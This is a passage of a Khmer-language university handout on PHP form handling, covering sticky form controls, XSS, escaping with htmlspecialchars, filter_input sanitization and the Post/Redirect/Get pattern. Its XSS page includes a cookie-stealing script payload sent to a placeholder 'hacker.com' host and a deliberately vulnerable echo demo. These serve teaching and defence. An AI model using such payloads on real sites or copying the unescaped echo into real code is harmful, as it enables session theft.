+            <br>• <b>Radio Buttons & Checkboxes:</b> ប្រើ attribute <code>checked</code>។
+            <br>• <b>Select Option Dropdowns:</b> ប្រើ attribute <code>selected</code>។
+            <br>• <b>Checkbox Array (<code>skills[]</code>):</b> ប្រើប្រាស់ <code>in_array($val, $array)</code> ដើម្បីត្រួតពិនិត្យវត្តមានធាតុក្នុង Array។</div>
+
+            <div class="content-label"><i class="fa-solid fa-terminal"></i> ខ. ទម្រង់ទូទៅ (General Syntax)៖</div>
+            <div class="syntax-box">// Sticky Radio: ($gender === 'male') ? 'checked' : ''
+// Sticky Select: ($degree === 'CS') ? 'selected' : ''
+// Sticky Checkbox Array: in_array('PHP', $skills) ? 'checked' : ''</div>
+
+            <div class="content-label"><i class="fa-solid fa-code"></i> គ. កូដ PHP ពេញលេញ (Full PHP Code)៖</div>
+            <div class="code-window">
+                <div class="code-header"><div class="mac-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><div class="code-title">sticky_multi_controls.php</div></div>
+<pre><span class="cv-tag">&lt;?php</span>
+<span class="cv-var">$gender</span> = <span class="cv-var">$_POST</span>[<span class="cv-str">'gender'</span>] ?? <span class="cv-str">'male'</span>;
+<span class="cv-var">$degree</span> = <span class="cv-var">$_POST</span>[<span class="cv-str">'degree'</span>] ?? <span class="cv-str">''</span>;
+<span class="cv-var">$skills</span> = <span class="cv-var">$_POST</span>[<span class="cv-str">'skills'</span>] ?? []; <span class="cv-cm">// Array of checkboxes</span>
+<span class="cv-tag">?&gt;</span>
+&lt;form method="POST"&gt;
+    &lt;!-- Radio --&gt;
+    &lt;input type="radio" name="gender" value="male" <span class="cv-tag">&lt;?=</span> (<span class="cv-var">$gender</span>===<span class="cv-str">'male'</span>)?<span class="cv-str">'checked'</span>:<span class="cv-str">''</span> <span class="cv-tag">?&gt;</span>&gt; ប្រុស
+    &lt;input type="radio" name="gender" value="female" <span class="cv-tag">&lt;?=</span> (<span class="cv-var">$gender</span>===<span class="cv-str">'female'</span>)?<span class="cv-str">'checked'</span>:<span class="cv-str">''</span> <span class="cv-tag">?&gt;</span>&gt; ស្រី&lt;br&gt;
+
+    &lt;!-- Select --&gt;
+    &lt;select name="degree"&gt;
+        &lt;option value="CS" <span class="cv-tag">&lt;?=</span> (<span class="cv-var">$degree</span>===<span class="cv-str">'CS'</span>)?<span class="cv-str">'selected'</span>:<span class="cv-str">''</span> <span class="cv-tag">?&gt;</span>&gt;CS&lt;/option&gt;
+        &lt;option value="IT" <span class="cv-tag">&lt;?=</span> (<span class="cv-var">$degree</span>===<span class="cv-str">'IT'</span>)?<span class="cv-str">'selected'</span>:<span class="cv-str">''</span> <span class="cv-tag">?&gt;</span>&gt;IT&lt;/option&gt;
+    &lt;/select&gt;&lt;br&gt;
+
+    &lt;!-- Checkbox Array --&gt;
+    &lt;input type="checkbox" name="skills[]" value="PHP" <span class="cv-tag">&lt;?=</span> <span class="cv-fn">in_array</span>(<span class="cv-str">'PHP'</span>,<span class="cv-var">$skills</span>)?<span class="cv-str">'checked'</span>:<span class="cv-str">''</span> <span class="cv-tag">?&gt;</span>&gt; PHP
+    &lt;input type="checkbox" name="skills[]" value="JS" <span class="cv-tag">&lt;?=</span> <span class="cv-fn">in_array</span>(<span class="cv-str">'JS'</span>,<span class="cv-var">$skills</span>)?<span class="cv-str">'checked'</span>:<span class="cv-str">''</span> <span class="cv-tag">?&gt;</span>&gt; JS&lt;br&gt;
+    &lt;button type="submit"&gt;Submit&lt;/button&gt;
+&lt;/form&gt;</pre>
+            </div>
+
+            <div class="content-label"><i class="fa-solid fa-desktop"></i> ឃ. លទ្ធផលបង្ហាញ (Execution Output)៖</div>
+            <div class="output-window">
+                <div class="output-header">Output Rendered HTML Behavior</div>
+                <div class="output-body">រាល់ Option, Checkbox (ច្រើនជម្រើស) ឬ Radio ទាំងអស់រក្សាស្ថានភាពជ្រើសរើស (Checked/Selected) យ៉ាងត្រឹមត្រូវ!</div>
+            </div>
+
+            <div class="extra-box">
+                <div class="extra-box-title"><i class="fa-solid fa-lightbulb"></i> ង. ចំណុចសម្គាល់ និងការអនុវត្តល្អៗ (Teacher Insights & Best Practices)៖</div>
+                • <b>កុំភ្លេចដង្កៀប <code>[]</code> ក្នុង Checkbox:</b> ត្រូវតែដាក់ឈ្មោះ <code>name="skills[]"</code> ជាមួយដង្កៀបចុង ដើម្បីឱ្យ PHP ទទួលទិន្នន័យជា Array! បើគ្មានដង្កៀបទេ PHP នឹងចាប់បានតែ Checkbox ចុងក្រោយគេបង្អស់តែមួយប៉ុណ្ណោះ។
+            </div>
+        </div>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ៩ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 10: SECTION 4.3.1 UNDERSTANDING XSS ATTACKS -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <div class="sub-heading"><i class="fa-solid fa-shield-halved"></i> ៤.៣ សុវត្ថិភាព Web & Sanitization Pipeline <span class="bloom-tag bloom-c3">C3</span> <span class="bloom-tag bloom-c4">C4</span></div>
+
+        <!-- 4.3.1 CARD -->
+        <div class="sub-topic-card">
+            <h4><i class="fa-solid fa-bug text-blue"></i> ៤.៣.១ ការយល់ដឹងពីការវាយប្រហារ XSS (Cross-Site Scripting) <span class="bloom-tag bloom-c4">C4</span></h4>
+            
+            <div class="content-label"><i class="fa-solid fa-circle-info"></i> ក. និយមន័យ (Definition)៖</div>
+            <div class="text-block"><b>XSS (Cross-Site Scripting)</b> គឺជាប្រភេទទម្រង់វាយប្រហារផ្នែកសន្តិសុខ Web ដ៏គ្រោះថ្នាក់បំផុតមួយ ដែលកើតឡើងនៅពេល Web Application ទទួលយកទិន្នន័យពី Form ហើយយកទៅ echo បង្ហាញលើ HTML Page វិញដោយគ្មានការបន្សាប (Sanitization)។ Hacker អាចលួចបញ្ចូល JavaScript Code (ឧ. <code>&lt;script&gt;document.location='http://hacker.com/steal?cookie='+document.cookie&lt;/script&gt;</code>) ដើម្បីលួច Session, Cookies ឬប្តូរទម្រង់ UI ទំព័រ Web។</div>
+
+            <div class="content-label"><i class="fa-solid fa-terminal"></i> ខ. ទម្រង់ទូទៅនៃការវាយប្រហារ (Vulnerable Pattern)៖</div>
+            <div class="syntax-box">// VULNERABLE CODE (កូដមានចន្លោះប្រហោងសុវត្ថិភាព!)
+$comment = $_POST['comment'];
+echo "&lt;div&gt;" . $comment . "&lt;/div&gt;"; // XSS Vulnerability here!</div>
+
+            <div class="content-label"><i class="fa-solid fa-code"></i> គ. កូដ PHP បង្ហាញពីចន្លោះប្រហោង XSS (Vulnerable Demo)៖</div>
+            <div class="code-window">
+                <div class="code-header"><div class="mac-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><div class="code-title">vulnerable_xss.php</div></div>
+<pre><span class="cv-tag">&lt;?php</span>
+<span class="cv-cm">// DANGEROUS CODE: Direct echo without sanitization</span>
+<span class="cv-kw">if</span> (<span class="cv-var">$_SERVER</span>[<span class="cv-str">"REQUEST_METHOD"</span>] === <span class="cv-str">"POST"</span>) {
+    <span class="cv-var">$user_comment</span> = <span class="cv-var">$_POST</span>[<span class="cv-str">'comment'</span>] ?? <span class="cv-str">''</span>;
+    <span class="cv-cm">// ប្រសិនបើ $user_comment មានផ្ទុក &lt;script&gt;... នោះវានឹងរត់ Script លើ Browser!</span>
+    <span class="cv-fn">echo</span> <span class="cv-str">"&lt;div class='box'&gt;មតិយោបល់៖ "</span> . <span class="cv-var">$user_comment</span> . <span class="cv-str">"&lt;/div&gt;"</span>;
+}
+<span class="cv-tag">?&gt;</span></pre>
+            </div>
+
+            <div class="content-label"><i class="fa-solid fa-desktop"></i> ឃ. លទ្ធផលបង្ហាញ (Execution Output)៖</div>
+            <div class="output-window">
+                <div class="output-header">Output Attack Behavior</div>
+                <div class="output-body">ប្រសិនបើ Hacker វាយបញ្ចូល៖ &lt;script&gt;alert('Hacked!');&lt;/script&gt;
+លទ្ធផល៖ Browser នឹងលោតផ្ទាំង Alert "Hacked!" ភ្លាមៗ (បញ្ជាក់ថា XSS វាយប្រហារបានជោគជ័យ)!</div>
+            </div>
+
+            <div class="extra-box">
+                <div class="extra-box-title"><i class="fa-solid fa-lightbulb"></i> ង. ចំណុចសម្គាល់ និងការអនុវត្តល្អៗ (Teacher Insights & Security Tips)៖</div>
+                • <b>ផលប៉ះពាល់ XSS:</b> XSS មិនត្រឹមតែលោត Alert លេងសើចឡើយ! វាអាចលួច <code>document.cookie</code> ដែលមានផ្ទុក Session ID រួចផ្ញើទៅកាន់ Hacker Server ដើម្បីធ្វើ Session Hijacking ចូល Account ជនរងគ្រោះបានយ៉ាងងាយ!
+            </div>
+        </div>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ១០ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 11: SECTION 4.3.2 XSS DEFENSE WITH HTMLSPECIALCHARS -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <!-- 4.3.2 CARD -->
+        <div class="sub-topic-card">
+            <h4><i class="fa-solid fa-user-shield text-blue"></i> ៤.៣.២ XSS Defense ជាមួយ <code>htmlspecialchars()</code> & Flags <span class="bloom-tag bloom-c3">C3</span></h4>
+            
+            <div class="content-label"><i class="fa-solid fa-circle-info"></i> ក. និយមន័យ (Definition)៖</div>
+            <div class="text-block">ដំណោះស្រាយការពារ XSS ដ៏មានប្រសិទ្ធភាពបំផុតក្នុង PHP គឺការប្រើប្រាស់អនុគមន៍ <code>htmlspecialchars()</code> នៅពេល echo បង្ហាញទិន្នន័យលើ HTML។ វាធ្វើការបំប្លែងតួអក្សរពិសេស HTML ដូចជា <code>&lt;</code> ទៅជា <code>&amp;lt;</code>, <code>&gt;</code> ទៅជា <code>&amp;gt;</code>, <code>&quot;</code> ទៅជា <code>&amp;quot;</code>, និង <code>'</code> ទៅជា <code>&amp;#039;</code> ដែលធ្វើឱ្យ Browser ចាត់ទុកវាជា Plain Text ធម្មតា មិនមែនជា Executable HTML/JS Tag ឡើយ។</div>
+
+            <div class="content-label"><i class="fa-solid fa-terminal"></i> ខ. ទម្រង់ទូទៅ (General Syntax)៖</div>
+            <div class="syntax-box">string htmlspecialchars(
+    string $string,
+    int $flags = ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5,
+    string $encoding = 'UTF-8'
+)</div>
+
+            <div class="content-label"><i class="fa-solid fa-code"></i> គ. កូដ PHP ពេញលេញ (Full PHP Code)៖</div>
+            <div class="code-window">
+                <div class="code-header"><div class="mac-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><div class="code-title">xss_defense_demo.php</div></div>
+<pre><span class="cv-tag">&lt;?php</span>
+<span class="cv-cm">// SECURE CODE: HTML Entity Encoding Defense</span>
+<span class="cv-var">$user_input</span> = <span class="cv-str">"&lt;script&gt;alert('XSS Attack!');&lt;/script&gt;"</span>;
+
+<span class="cv-cm">// បំប្លែងតួអក្សរពិសេសទាំងអស់ រួមទាំង Single Quote (') និង Double Quote (")</span>
+<span class="cv-var">$safe_output</span> = <span class="cv-fn">htmlspecialchars</span>(<span class="cv-var">$user_input</span>, ENT_QUOTES, <span class="cv-str">'UTF-8'</span>);
+<span class="cv-tag">?&gt;</span>
+&lt;div class="box"&gt;
+    &lt;p&gt;ទិន្នន័យសុវត្ថិភាព៖ <span class="cv-tag">&lt;?=</span> <span class="cv-var">$safe_output</span> <span class="cv-tag">?&gt;</span>&lt;/p&gt;
+&lt;/div&gt;</pre>
+            </div>
+
+            <div class="content-label"><i class="fa-solid fa-desktop"></i> ឃ. លទ្ធផលបង្ហាញ (Execution Output)៖</div>
+            <div class="output-window">
+                <div class="output-header">Output (នៅលើ HTML Page Source)</div>
+                <div class="output-body">នៅលើ Browser Screen ឃើញអក្សរ៖ &lt;script&gt;alert('XSS Attack!');&lt;/script&gt;
+នៅលើ HTML Source Code គឺ៖ &amp;lt;script&amp;gt;alert(&amp;#039;XSS Attack!&amp;#039;);&amp;lt;/script&amp;gt; (សុវត្ថិភាព ១០០%!)</div>
+            </div>
+
+            <div class="extra-box">
+                <div class="extra-box-title"><i class="fa-solid fa-lightbulb"></i> ង. ចំណុចសម្គាល់ និងការអនុវត្តល្អៗ (Teacher Insights & Best Practices)៖</div>
+                • <b>សារៈសំខាន់នៃ <code>ENT_QUOTES</code>:</b> ដោយសារ Default Flag របស់ <code>htmlspecialchars()</code> មិនបំប្លែង Single Quote (<code>'</code>) ឡើយ ដូច្នេះត្រូវតែបន្ថែម Flag <code>ENT_QUOTES</code> ជានិច្ច ដើម្បីបំប្លែងទាំង <code>"</code> និង <code>'</code> ទប់ស្កាត់ Attribute Injection!
+            </div>
+        </div>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ១១ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 12: SECTION 4.3.3 PHP 8 INPUT SANITIZATION PIPELINE -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <!-- 4.3.3 CARD -->
+        <div class="sub-topic-card">
+            <h4><i class="fa-solid fa-broom text-blue"></i> ៤.៣.៣ PHP 8 Input Sanitization ជាមួយ <code>filter_input()</code> <span class="bloom-tag bloom-c4">C4</span></h4>
+            
+            <div class="content-label"><i class="fa-solid fa-circle-info"></i> ក. និយមន័យ (Definition)៖</div>
+            <div class="text-block">ក្រៅពីការធ្វើ Escaping នៅពេល output, PHP 8 ផ្តល់នូវអនុគមន៍ <code>filter_input()</code> សម្រាប់ធ្វើ <b>Sanitization</b> (សម្អាតទិន្នន័យ) ភ្លាមៗនៅពេលទទួលយក Request។ គេប្រើ <code>FILTER_SANITIZE_EMAIL</code> សម្រាប់លុប Characters ដែលមិនត្រូវមានក្នុង អ៊ីមែល និង <code>FILTER_SANITIZE_SPECIAL_CHARS</code> សម្រាប់បំប្លែងតួអក្សរពិសេស HTML ភ្លាមៗ។</div>
+
+            <div class="content-label"><i class="fa-solid fa-terminal"></i> ខ. ទម្រង់ទូទៅ (General Syntax)៖</div>
+            <div class="syntax-box">mixed filter_input(
+    int $type, // INPUT_POST, INPUT_GET, INPUT_COOKIE
+    string $var_name,
+    int $filter = FILTER_DEFAULT
+)</div>
+
+            <div class="content-label"><i class="fa-solid fa-code"></i> គ. កូដ PHP ពេញលេញ (Full PHP Code)៖</div>
+            <div class="code-window">
+                <div class="code-header"><div class="mac-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><div class="code-title">sanitization_pipeline.php</div></div>
+<pre><span class="cv-tag">&lt;?php</span>
+<span class="cv-kw">if</span> (<span class="cv-var">$_SERVER</span>[<span class="cv-str">"REQUEST_METHOD"</span>] === <span class="cv-str">"POST"</span>) {
+    <span class="cv-cm">// 1. Sanitize Special HTML Characters</span>
+    <span class="cv-var">$username</span> = <span class="cv-fn">filter_input</span>(INPUT_POST, <span class="cv-str">'username'</span>, FILTER_SANITIZE_SPECIAL_CHARS);
+
+    <span class="cv-cm">// 2. Sanitize Email (Remove invalid characters)</span>
+    <span class="cv-var">$email</span> = <span class="cv-fn">filter_input</span>(INPUT_POST, <span class="cv-str">'email'</span>, FILTER_SANITIZE_EMAIL);
+
+    <span class="cv-fn">echo</span> <span class="cv-str">"ឈ្មោះសម្អាតរួច៖ "</span> . <span class="cv-var">$username</span> . <span class="cv-str">"&lt;br&gt;"</span>;
+    <span class="cv-fn">echo</span> <span class="cv-str">"អ៊ីមែលសម្អាតរួច៖ "</span> . <span class="cv-var">$email</span>;
+}
+<span class="cv-tag">?&gt;</span></pre>
+            </div>
+
+            <div class="content-label"><i class="fa-solid fa-desktop"></i> ឃ. លទ្ធផលបង្ហាញ (Execution Output)៖</div>
+            <div class="output-window">
+                <div class="output-header">Output (ពេល User វាយ email: "sok (test) @gmail.com")</div>
+                <div class="output-body">ឈ្មោះសម្អាតរួច៖ sok
+អ៊ីមែលសម្អាតរួច៖ soktest@gmail.com (លុប Space និង Parentheses ចោលស្វ័យប្រវត្តិ)</div>
+            </div>
+
+            <div class="extra-box">
+                <div class="extra-box-title"><i class="fa-solid fa-lightbulb"></i> ង. ចំណុចសម្គាល់ និងការអនុវត្តល្អៗ (Teacher Insights & Best Practices)៖</div>
+                • <b>Sanitization vs Validation:</b> Sanitization គឺជាការ **សម្អាត/កែប្រែ** ទិន្នន័យឱ្យមានសុវត្ថិភាព (លុបតួអក្សរមិនល្អចោល)។ ឯ Validation គឺជាការ **ផ្ទៀងផ្ទាត់/បដិសេធ** (Reject) ប្រសិនបើទិន្នន័យនោះមិនត្រឹមត្រូវ។ ក្នុងប្រព័ន្ធវិជ្ជាជីវៈ យើងត្រូវប្រើប្រាស់ទាំងពីររួមគ្នា!
+            </div>
+        </div>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ១២ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 13: SECTION 4.4.1 SINGLE-FILE FORM PROCESSING -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <div class="sub-heading"><i class="fa-solid fa-cubes-stacked"></i> ៤.៤ ស្ថាបត្យកម្ម Form Processing ទំនើប <span class="bloom-tag bloom-c4">C4</span> <span class="bloom-tag bloom-c5">C5</span> <span class="bloom-tag bloom-c6">C6</span></div>
+
+        <!-- 4.4.1 CARD -->
+        <div class="sub-topic-card">
+            <h4><i class="fa-solid fa-file-code text-blue"></i> ៤.៤.១ Single-File Form Processing Architecture <span class="bloom-tag bloom-c4">C4</span></h4>
+            
+            <div class="content-label"><i class="fa-solid fa-circle-info"></i> ក. និយមន័យ (Definition)៖</div>
+            <div class="text-block"><b>Single-File Form Processing Architecture</b> គឺជាការដាក់កូដបង្កើត HTML Form, កូដ PHP Validation Processing Logic, និងការបង្ហាញ Error Feedback នៅក្នុង <b>.php File តែមួយ</b>។ រចនាសម្ព័ន្ធនេះមានប្រជាប្រិយភាពខ្លាំង ព្រោះវាងាយស្រួលគ្រប់គ្រង Sticky State, បង្ហាញ Error ចំពីក្រោម Field នីមួយៗ, និងមិនបាច់បង្កើត File ច្រើនរញ៉េរញ៉ៃ។</div>
+
+            <div class="content-label"><i class="fa-solid fa-terminal"></i> ខ. ទម្រង់រចនាសម្ព័ន្ធទូទៅ (Page Flow Architecture)៖</div>
+            <div class="syntax-box">1. Define variables and $errors array
+2. Check if ($_SERVER["REQUEST_METHOD"] === "POST")
+   a. Trim & Sanitize inputs
+   b. Perform Validation Rules
+   c. If no errors, Save Data / Redirect
+3. Render HTML Form with Sticky Values & Error Messages</div>
+
+            <div class="content-label"><i class="fa-solid fa-code"></i> គ. កូដ PHP ពេញលេញ (Full PHP Code)៖</div>
+            <div class="code-window">
+                <div class="code-header"><div class="mac-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><div class="code-title">single_file_form.php</div></div>
+<pre><span class="cv-tag">&lt;?php</span>
+<span class="cv-var">$errors</span> = []; <span class="cv-var">$username</span> = <span class="cv-str">''</span>;
+
+<span class="cv-kw">if</span> (<span class="cv-var">$_SERVER</span>[<span class="cv-str">"REQUEST_METHOD"</span>] === <span class="cv-str">"POST"</span>) {
+    <span class="cv-var">$username</span> = <span class="cv-fn">trim</span>(<span class="cv-var">$_POST</span>[<span class="cv-str">'username'</span>] ?? <span class="cv-str">''</span>);
+    
+    <span class="cv-kw">if</span> (<span class="cv-fn">empty</span>(<span class="cv-var">$username</span>)) {
+        <span class="cv-var">$errors</span>[<span class="cv-str">'username'</span>] = <span class="cv-str">"សូមបញ្ចូលឈ្មោះ!"</span>;
+    }
+}
+<span class="cv-tag">?&gt;</span>
+&lt;form action="<span class="cv-tag">&lt;?=</span> <span class="cv-fn">htmlspecialchars</span>(<span class="cv-var">$_SERVER</span>[<span class="cv-str">'PHP_SELF'</span>]) <span class="cv-tag">?&gt;</span>" method="POST"&gt;
+    &lt;input type="text" name="username" value="<span class="cv-tag">&lt;?=</span> <span class="cv-fn">htmlspecialchars</span>(<span class="cv-var">$username</span>) <span class="cv-tag">?&gt;</span>"&gt;
+    &lt;span style="color:red;"&gt;<span class="cv-tag">&lt;?=</span> <span class="cv-var">$errors</span>[<span class="cv-str">'username'</span>] ?? <span class="cv-str">''</span> <span class="cv-tag">?&gt;</span>&lt;/span&gt;
+    &lt;button type="submit"&gt;Submit&lt;/button&gt;
+&lt;/form&gt;</pre>
+            </div>
+
+            <div class="content-label"><i class="fa-solid fa-desktop"></i> ឃ. លទ្ធផលបង្ហាញ (Execution Output)៖</div>
+            <div class="output-window">
+                <div class="output-header">Output UX Flow</div>
+                <div class="output-body">ទំព័រដំណើរការដោយរលូន ទាំងពេលបង្ហាញ Form ដំបូង និងពេល Submit ផ្ទៀងផ្ទាត់ Error ដោយស្វ័យប្រវត្តិ។</div>
+            </div>
+
+            <div class="extra-box">
+                <div class="extra-box-title"><i class="fa-solid fa-lightbulb"></i> ង. ចំណុចសម្គាល់ និងការអនុវត្តល្អៗ (Teacher Insights & Best Practices)៖</div>
+                • <b>ការប្រើប្រាស់ <code>$_SERVER['PHP_SELF']</code>:</b> ពេលប្រើ <code>action="&lt;?= htmlspecialchars($_SERVER['PHP_SELF']) ?&gt;"</code> ត្រូវតែ Wrap ជាមួយ <code>htmlspecialchars()</code> ជានិច្ច ដើម្បីការពារ XSS Vulnerability តាមរយៈ URL Query Injection!
+            </div>
+        </div>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ១៣ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 14: SECTION 4.4.2 PRG PATTERN -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <!-- 4.4.2 CARD -->
+        <div class="sub-topic-card">
+            <h4><i class="fa-solid fa-diagram-next text-blue"></i> ៤.៤.២ Post/Redirect/Get (PRG) Pattern ជាមួយ <code>header()</code> <span class="bloom-tag bloom-c5">C5</span></h4>
+            
+            <div class="content-label"><i class="fa-solid fa-circle-info"></i> ក. និយមន័យ (Definition)៖</div>
+            <div class="text-block"><b>PRG Pattern (Post/Redirect/Get)</b> គឺជា Design Pattern ស្តង់ដារឧស្សាហកម្ម Web សម្រាប់ដោះស្រាយបញ្ហា Form Resubmission។ បន្ទាប់ពីការធ្វើ Processing POST Form ជោគជ័យ Server ត្រូវផ្ញើ HTTP Response Header បញ្ជាឱ្យ Browser ធ្វើការ <b>Redirect</b> ទៅកាន់ HTTP GET Page ថ្មីមួយតាមរយៈ <code>header("Location: success.php"); exit();</code>។ ធ្វើដូចនេះ នៅពេល User ចុច Refresh (F5) វានឹងរត់តែ GET Page មិនរត់ POST Processing ស្ទួនឡើយ។</div>
+
+            <div class="content-label"><i class="fa-solid fa-terminal"></i> ខ. ទម្រង់ទូទៅ (General Syntax)៖</div>
+            <div class="syntax-box">// Post-Redirect-Get Workflow
+if ($_SERVER["REQUEST_METHOD"] === "POST" && empty($errors)) {
+    // 1. Save data to Database
+    // 2. Redirect to GET Request
+    header("Location: thank_you.php?status=success");
+    exit(); // ត្រូវតែដាក់ exit() ឬ die() បន្ទាប់ពី header() ជានិច្ច!
+}</div>
+
+            <div class="content-label"><i class="fa-solid fa-code"></i> គ. កូដ PHP ពេញលេញ (Full PHP Code)៖</div>
+            <div class="code-window">
+                <div class="code-header"><div class="mac-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><div class="code-title">prg_pattern_demo.php</div></div>
+<pre><span class="cv-tag">&lt;?php</span>
+<span class="cv-kw">if</span> (<span class="cv-var">$_SERVER</span>[<span class="cv-str">"REQUEST_METHOD"</span>] === <span class="cv-str">"POST"</span>) {
+    <span class="cv-cm">// Process Save Data Logic...</span>
+    
+    <span class="cv-cm">// PRG Redirect to GET Request</span>
+    <span class="cv-fn">header</span>(<span class="cv-str">"Location: prg_pattern_demo.php?status=success"</span>);
+    <span class="cv-kw">exit</span>();
+}
+<span class="cv-tag">?&gt;</span>
+&lt;!-- Display Success Feedback Message --&gt;
+<span class="cv-tag">&lt;?php</span> <span class="cv-kw">if</span> ((<span class="cv-var">$_GET</span>[<span class="cv-str">'status'</span>] ?? <span class="cv-str">''</span>) === <span class="cv-str">'success'</span>): <span class="cv-tag">?&gt;</span>
+    &lt;div style="color:green;"&gt;✓ ការចុះឈ្មោះត្រូវបានរក្សាទុកដោយជោគជ័យ!&lt;/div&gt;
+<span class="cv-tag">&lt;?php</span> <span class="cv-kw">endif</span>; <span class="cv-tag">?&gt;</span></pre>
+            </div>
+
+            <div class="content-label"><i class="fa-solid fa-desktop"></i> ឃ. លទ្ធផលបង្ហាញ (Execution Output)៖</div>
+            <div class="output-window">
+                <div class="output-header">Output Redirect Behavior</div>
+                <div class="output-body">ពេល Submit ជោគជ័យ URL ប្រែជា prg_pattern_demo.php?status=success។
+ទោះបីជា User ចុច Refresh (F5) ប៉ុន្មានដងក៏គ្មាន Warning "Confirm Form Resubmission" លោតរំខានឡើយ!</div>
+            </div>
+
+            <div class="extra-box">
+                <div class="extra-box-title"><i class="fa-solid fa-lightbulb"></i> ង. ចំណុចសម្គាល់ និងការអនុវត្តល្អៗ (Teacher Insights & Best Practices)៖</div>
+                • <b>បម្រាមដាច់ខាត "Headers already sent":</b> អនុគមន៍ <code>header()</code> ត្រូវតែប្រកាសរត់ **មុនពេល** មាន HTML Output (Echo, Spaces, Whitespace) បាញ់ទៅ Browser! បើមាន HTML ចេញមុន នោះ PHP នឹងបោះ Fatal Error "Cannot modify header information - headers already sent" ភ្លាមៗ។<br>
+                • <b>តម្រូវការ <code>exit()</code>:</b> ត្រូវតែដាក់ <code>exit();</code> ភ្លាមៗបន្ទាប់ពី <code>header()</code> ដើម្បីបញ្ឈប់ Script Execution ការពារ Hacker មិនឱ្យរត់កូដខាងក្រោមបន្ត!
